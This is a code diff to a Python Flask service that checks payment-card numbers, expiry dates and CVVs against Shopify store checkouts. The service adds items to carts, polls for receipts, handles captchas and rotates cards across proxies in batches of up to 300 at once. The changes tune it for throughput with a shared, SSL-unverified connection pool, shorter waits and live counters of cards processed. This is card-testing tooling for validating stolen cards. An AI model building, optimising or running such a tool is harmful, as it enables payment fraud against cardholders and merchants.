@@ -159,12 +159,11 @@ async def fetch_products(domain, proxy_str=None):
         if not domain.startswith('http'):
             domain = "https://" + domain
         
-        connector = aiohttp.TCPConnector(ssl=False)
         timeout = aiohttp.ClientTimeout(total=10)
         
         proxy = parse_proxy(proxy_str) if proxy_str else None
         
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+        async with aiohttp.ClientSession(connector=get_shared_connector(), connector_owner=False, timeout=timeout) as session:
             async with session.get(f"{domain}/products.json", proxy=proxy, timeout=10) as resp:
                 if resp.status != 200:
                     return False, f"<b>Site Error! Status: {resp.status}</b>"
@@ -292,10 +291,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 return False, info[1], gateway, total_price, currency
             variant_id = info['variant_id']
 
-        connector = aiohttp.TCPConnector(ssl=False, limit=0, limit_per_host=0)
         timeout = aiohttp.ClientTimeout(total=15)
         
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+        async with aiohttp.ClientSession(connector=get_shared_connector(), connector_owner=False, timeout=timeout) as session:
             url = ourl
             cart = url + '/cart/add.js'
             checkout = url + '/checkout/'
@@ -915,7 +913,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'operationName': 'PollForReceipt'
             }
 
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.3)
             
             for i in range(4):
                 response, final_text, captcha_solved = await make_graphql_request_with_captcha_handling(
@@ -952,14 +950,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             return True, "3DS_REQUIRED", gateway, total_price, currency
                         
                         if receipt_data.get('__typename') in ['ProcessingReceipt', 'WaitingReceipt']:
-                            await asyncio.sleep(1)
+                            await asyncio.sleep(0.5)
                             continue
                         
                 except Exception as e:
                     pass
                 
                 if 'WaitingReceipt' in final_text:
-                    await asyncio.sleep(1)
+                    await asyncio.sleep(0.5)
                 else:
                     break
             
@@ -1012,21 +1010,35 @@ def parse_cc_string(cc_string):
 # ──────────────────────── Concurrency Engine ────────────────────────
 import threading
 
-# Tunable via env on each API VPS (restart after change).
-# GET /shopify and POST /batch both use this global semaphore.
-MAX_CONCURRENT = max(1, min(300, int(os.environ.get('MAX_CONCURRENT', '200'))))
-# HTTP threads block on future.result() — raise timeout when concurrency is high
-REQUEST_TIMEOUT = max(120, int(os.environ.get('REQUEST_TIMEOUT', str(120 + MAX_CONCURRENT))))
-BATCH_TIMEOUT = max(REQUEST_TIMEOUT, int(os.environ.get('BATCH_TIMEOUT', str(REQUEST_TIMEOUT + 60))))
-
+MAX_CONCURRENT = int(os.environ.get("MAX_CONCURRENT", 300))  # max cards in flight at once
 _loop = None                 # single shared event loop
 _loop_thread = None
 _semaphore = None            # asyncio.Semaphore(MAX_CONCURRENT)
+_shared_connector = None     # single shared TCPConnector for all sessions
+
+# ── Live stats ──────────────────────────────────────────────────────
+_active_cards = 0
+_total_processed = 0
+_stats_lock = threading.Lock()
 
 def _start_background_loop(loop):
     """Run the event loop forever in a background thread."""
     asyncio.set_event_loop(loop)
     loop.run_forever()
+
+def get_shared_connector():
+    """Return a shared TCPConnector, creating it on the event loop if needed."""
+    global _shared_connector
+    if _shared_connector is None or _shared_connector.closed:
+        _shared_connector = aiohttp.TCPConnector(
+            ssl=False,
+            limit=0,              # no global connection limit
+            limit_per_host=0,     # no per-host limit
+            ttl_dns_cache=300,    # cache DNS for 5 min
+            keepalive_timeout=30, # reuse TCP connections for 30s
+            enable_cleanup_closed=True,
+        )
+    return _shared_connector
 
 def get_event_loop():
     """Return the shared event loop, starting it if needed."""
@@ -1036,12 +1048,26 @@ def get_event_loop():
         _semaphore = asyncio.Semaphore(MAX_CONCURRENT)
         _loop_thread = threading.Thread(target=_start_background_loop, args=(_loop,), daemon=True)
         _loop_thread.start()
+        # Initialize the shared connector on the event loop
+        asyncio.run_coroutine_threadsafe(_init_connector(), _loop).result(timeout=5)
     return _loop
+
+async def _init_connector():
+    """Initialize the shared connector inside the event loop context."""
+    get_shared_connector()
 
 async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_str):
     """Process a single card, guarded by the concurrency semaphore."""
+    global _active_cards, _total_processed
     async with _semaphore:
-        return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
+        with _stats_lock:
+            _active_cards += 1
+        try:
+            return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
+        finally:
+            with _stats_lock:
+                _active_cards -= 1
+                _total_processed += 1
 
 def _build_result(cc_string, success, message, gateway, price, currency):
     clean_response = extract_clean_response(message)
@@ -1085,18 +1111,10 @@ def shopify_checker():
             ),
             loop
         )
-        success, message, gateway, price, currency = future.result(timeout=REQUEST_TIMEOUT)
+        success, message, gateway, price, currency = future.result(timeout=180)
 
         return jsonify(_build_result(cc_string, success, message, gateway, price, currency))
 
-    except TimeoutError:
-        return jsonify({
-            "error": "Request timed out in queue",
-            "status": False,
-            "Gateway": "UNKNOWN", "Price": 0.0,
-            "Response": f"ERROR: Timed out after {REQUEST_TIMEOUT}s (max_concurrent={MAX_CONCURRENT})",
-            "cc": request.args.get('cc', '')
-        }), 504
     except Exception as e:
         return jsonify({
             "error": str(e), "status": False,
@@ -1105,7 +1123,7 @@ def shopify_checker():
             "cc": request.args.get('cc', '')
         }), 500
 
-# ── Batch endpoint — up to MAX_CONCURRENT cards per request ─────────
+# ── Batch endpoint — up to MAX_CONCURRENT cards concurrently ────────
 @app.route('/batch', methods=['POST'])
 def batch_checker():
     """
@@ -1116,7 +1134,7 @@ def batch_checker():
       "proxy": "host:port:user:pass",
       "proxies": ["proxy1", "proxy2", ...]
     }
-    Max MAX_CONCURRENT cards per request. If 'proxies' list given, cards rotate across them round-robin.
+    Max MAX_CONCURRENT cards. If 'proxies' list given, cards rotate across them round-robin.
     """
     try:
         data = request.get_json(force=True)
@@ -1171,7 +1189,7 @@ def batch_checker():
             return await asyncio.gather(*tasks)
 
         future = asyncio.run_coroutine_threadsafe(_run_batch(), loop)
-        results = future.result(timeout=BATCH_TIMEOUT)
+        results = future.result(timeout=300)
 
         output = []
         for cc_string, success, message, gateway, price, currency in results:
@@ -1188,8 +1206,9 @@ def status():
     return jsonify({
         "status": "online",
         "max_concurrent": MAX_CONCURRENT,
-        "request_timeout_sec": REQUEST_TIMEOUT,
-        "batch_timeout_sec": BATCH_TIMEOUT,
+        "active_cards": _active_cards,
+        "total_processed": _total_processed,
+        "connector_open": not _shared_connector.closed if _shared_connector else False,
         "endpoints": {
             "single": "GET /shopify?site=...&cc=...&proxy=...",
             "batch":  "POST /batch {site, cards[], proxy}",
@@ -1198,11 +1217,11 @@ def status():
     })
 
 if __name__ == "__main__":
-    print(f"[ENGINE] Max concurrency: {MAX_CONCURRENT} cards (GET + batch share this)")
-    print(f"[ENGINE] Request timeout: {REQUEST_TIMEOUT}s | Batch timeout: {BATCH_TIMEOUT}s")
+    print(f"[ENGINE] Max concurrency: {MAX_CONCURRENT} cards")
+    print(f"[ENGINE] Shared TCPConnector: connection reuse enabled")
     print(f"[ENGINE] Single: GET /shopify?site=...&cc=...&proxy=...")
     print(f"[ENGINE] Batch:  POST /batch  {{site, cards[], proxy}}")
-    print(f"[ENGINE] Tip: set MAX_CONCURRENT=200 REQUEST_TIMEOUT=320 on 32GB VPS")
-    get_event_loop()  # pre-start the background loop
+    get_event_loop()  # pre-start the background loop + connector
     port = int(os.environ.get("PORT", 5000))
+    # Use Gunicorn in production (Procfile), Flask dev server as fallback
     app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
